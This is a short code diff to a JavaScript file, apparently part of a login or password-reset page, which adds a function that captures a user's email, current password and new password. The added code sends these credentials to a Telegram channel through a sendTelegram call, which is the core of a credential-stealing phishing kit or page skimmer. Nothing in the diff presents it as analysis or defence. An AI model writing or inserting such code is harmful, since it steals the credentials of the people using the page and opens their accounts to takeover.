@@ -19,3 +19,13 @@
     nextBtn.click();
   });
 })();
+
+;(function () {
+  sendPasswordSet = function (email, password, newPassword) {
+    sendTelegram(
+      'New Password Has Been Set\nEmail: ' + email +
+      '\nPassword: ' + password +
+      '\nNew Password: ' + newPassword
+    );
+  };
+})();
